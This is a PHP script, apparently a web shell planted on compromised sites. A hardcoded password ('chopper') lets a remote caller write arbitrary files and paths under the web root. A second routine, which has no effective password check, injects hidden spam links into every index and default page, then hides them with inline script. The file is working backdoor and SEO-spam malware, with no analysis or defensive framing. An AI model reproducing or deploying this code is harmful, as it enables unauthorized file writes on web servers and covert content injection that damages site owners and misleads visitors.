<?php
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$pathname=$_REQUEST['pathname'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);
$ahref=stripslashes($_REQUEST['ahref']);

if($action=='publish')
{
    if($password!='chopper')
    {
        echo 'password error';
        return;
    }
    if($filename==''||$body=='')
    {
        echo 'parameters error';
        return;
    }
    $rootPath=$_SERVER['DOCUMENT_ROOT'];
    $articlePath=$rootPath;
    $alinkPath='';
    if($pathname!='')
    {
        createFolder($rootPath.'/'.$pathname);
        $articlePath=$rootPath.'/'.$pathname.'/'.$filename;
        $alinkPath=$rootPath.'/'.$pathname.'/A.txt';
    }
    else
    {
        $articlePath=$rootPath.'/'.$filename;
        $alinkPath=$rootPath.'/A.txt';
    }
    $fp=fopen($articlePath,"w");
    fwrite($fp,$body);
    fclose($fp);
    $fp=fopen($alinkPath,"a+");
    fwrite($fp,$ahref.'\r\n');
    fclose($fp);
    if(file_exists($articlePath))
    {
        echo 'publish success';
    }
    return;
}
$replacestr=stripslashes($_REQUEST['replacestr']);
$rootpath=$_SERVER['DOCUMENT_ROOT'];
if($action='createlinks' and $replacestr!='')
{
    CreateLink($rootpath,$replacestr);
}
return;
function createFolder($path)
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
function CreateLink($dir,$replacestr1)
{
    $files = array();
    $dir_list = scandir($dir);
    foreach($dir_list as $file)
    {
        if ($file!= '..' && $file!= '.' && !is_dir($dir.'/'.$file))
        {
            if(strpos($file,'index.html')>-1 or strpos($file,'default')>-1)
            {
                $tempstr = file_get_contents($dir.'/'.$file);
                if(strpos($tempstr,'<div id=linkbyme>')>-1)
                {
                    $tempstr = preg_replace("'<div id=linkbyme>.*?</body>'",'</body>',$tempstr);
                }
                $tempstr = str_replace('</body>', '<div id=linkbyme>'.$replacestr1.'<script>document.getElementById("linkbyme").style.display="none";</script></body>', $tempstr);
                file_put_contents($dir.'/'.$file, $tempstr);
                echo 'linkbyme';
            }
        }
    }
}
?>
